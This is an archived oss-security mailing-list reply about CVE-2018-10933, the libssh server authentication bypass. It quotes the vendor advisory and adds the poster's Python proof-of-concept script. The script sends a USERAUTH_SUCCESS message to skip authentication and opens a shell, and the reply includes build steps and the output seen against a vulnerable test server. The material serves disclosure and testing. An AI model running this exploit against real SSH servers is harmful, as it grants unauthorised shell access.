X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["2008" "Wednesday" "17" "October" "2018" "16:13:24" "+0700" "Minh Tuan Luong" "not.soledad@gmail.com" "<ec0cb776-0caf-c27e-dcff-ff68001900c2@gmail.com>" "67" "Re: [oss-security] CVE-2018-10933: libssh: authentication bypass in server code" nil nil nil "10" "2018101709:13:24" "[oss-security] CVE-2018-10933: libssh: authentication bypass in server code" (number mark "U       not.soledad@ Oct 17   67/2008  " thread-indent "\"Re: [oss-security] CVE-2018-10933: libssh: authentication bypass in server code\"\n") "<20181016122143.o7bwrhh3chhmhguk@suse.de>" ("<20181016122143.o7bwrhh3chhmhguk@suse.de>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 30650 invoked by uid 550); 17 Oct 2018 12:47:24 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 6022 invoked from network); 17 Oct 2018 09:13:48 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20161025;
        h=subject:to:references:from:message-id:date:user-agent:mime-version
         :in-reply-to:content-transfer-encoding:content-language;
        bh=Zpvj4AejtFkVUXw0aA3nqKE2w4KirfeKWM1E0GgTFCM=;
        b=XdWoE7HjJHL10zaLvHKJVljrX0LZd5FAWKm/aWzA39FFZR5ByI2ruMlij+RHg5JgS0
         m5RnbyU0or8iefIVDa02WC7Da1lS4W7zb+2oc9+F3xYNKGzyAQ2zYLhjfphgG1ifCO5q
         0WwLwEoXueeXXd4QCMmrywcZxVdo7KmtCcQsFnNl96A+W5VKgBzW7rSinxLtnQsOZiEI
         aNEzXUJN4t059AgKZHZZ7sTYonN76aWcZxko3GzhCsglyRoFvesfp87dp9PvlLsQOkfz
         EycRKfY8ieJMwSJIvjjDsY8R1o90LeReZ5j3dYi1AUJf2CaVpGwXHBSglsmFzkErqu/V
         DaWg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:subject:to:references:from:message-id:date
         :user-agent:mime-version:in-reply-to:content-transfer-encoding
         :content-language;
        bh=Zpvj4AejtFkVUXw0aA3nqKE2w4KirfeKWM1E0GgTFCM=;
        b=CSYvu7eDAEnRmyQVNrROdcJfC6woXLvA9238Wu27LrRpIuYOWmjeAsn6+6bIEkq6M4
         zZMzRvAiybJ/UNrmxfsFKjytoqOs6+xFkbgpC9EuvIiudOdqiL9ID4fvKEyKWb0IZkms
         0w2KGjPkj+i+eMcxqfH3WdMMdegVTii0bvSz/TmUISCg/XbABVOZ61jAMmXmHMpUdWQR
         tlsIB7lIoNZ3iWvWat6+sAzzF5qUuTNtrdYUtqWIk4YZYEYzstCaQX7cgBNa3RjjnYOQ
         DdfgG+RXkb6ofPW91u2oje/hUYuBqR13vq9jII6/urxqd045CKfRIIkw74LbsQvGC+b2
         RdPg==
X-Gm-Message-State: ABuFfojpl3oiyBKHafQeLe+e8uRiMEp8ypHegMhcuEeLnwd+QPW+Bolv
	z9vB3SWZ8+rMmJYr5xzS2JW58+u+
X-Google-Smtp-Source: ACcGV61mwzKTEs4Yfbi+R9GtwrItikzBlTZwkPadqMRz9iG1HpYy2WURl78xNAOixUsRVrwfu+JEYQ==
X-Received: by 2002:a17:902:a618:: with SMTP id u24-v6mr24877151plq.77.1539767615611;
        Wed, 17 Oct 2018 02:13:35 -0700 (PDT)
To: oss-security@lists.openwall.com
References: <20181016122143.o7bwrhh3chhmhguk@suse.de>
From: Minh Tuan Luong <not.soledad@gmail.com>
Message-ID: <ec0cb776-0caf-c27e-dcff-ff68001900c2@gmail.com>
Date: Wed, 17 Oct 2018 16:13:24 +0700
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101
 Thunderbird/52.9.1
MIME-Version: 1.0
In-Reply-To: <20181016122143.o7bwrhh3chhmhguk@suse.de>
Content-Type: text/plain; charset=utf-8; format=flowed
Content-Transfer-Encoding: 8bit
Content-Language: en-US
Subject: Re: [oss-security] CVE-2018-10933: libssh: authentication bypass in
 server code

I have coded a simple POC for this CVE:

--- CVE-2018-10933.py ----

import paramiko
import socket
import sys

nbytes = 4096
hostname = "127.0.0.1"
port = 2222

sock = socket.socket()
try:
     sock.connect((hostname, port))
     # instantiate transport
     m = paramiko.message.Message()
     transport = paramiko.transport.Transport(sock)
     transport.start_client()

     m.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
     transport._send_message(m)

     cmd_channel = transport.open_session()
     cmd_channel.invoke_shell()

except socket.error:
     print '[-] Connecting to host failed. Please check the specified 
host and port.'
     sys.exit(1)

-----

to test this code: get vulnerable version of libssh at homepage: 
https://www.libssh.org/files/0.7/libssh-0.7.4.tar.xz
after uncompress and build, go to example directory, there's a simple 
sshd server using libssh name: samplesshd-cb

run this simple sshd by command:
     $ samplesshd-cb 127.0.0.1 -p 2222
then run my code, output will be:
Allocated session channel
Allocated shell
mean that i can bypass authentication and spawn a shell without any 
credential

Regard, Soledad

On 10/16/2018 7:21 PM, Marcus Meissner wrote:
> Hi,
>
> https://www.libssh.org/2018/10/16/libssh-0-8-4-and-0-7-6-security-and-bugfix-release/
>
> -----
> libssh 0.8.4 and 0.7.6 security and bugfix release
>
> This is an important security and maintenance release in order to address CVE-2018-10933.
>
> libssh versions 0.6 and above have an authentication bypass vulnerability in the server code. By presenting the server an SSH2_MSG_USERAUTH_SUCCESS message in place of the SSH2_MSG_USERAUTH_REQUEST message which the server would expect to initiate authentication, the attacker could successfully authentciate without any credentials.
>
> The bug was discovered by Peter Winter-Smith of NCC Group.
> -----
>
> This only affects libssh operating in _server_ mode, but not the usual used client mode.
>
> Ciao, Marcus

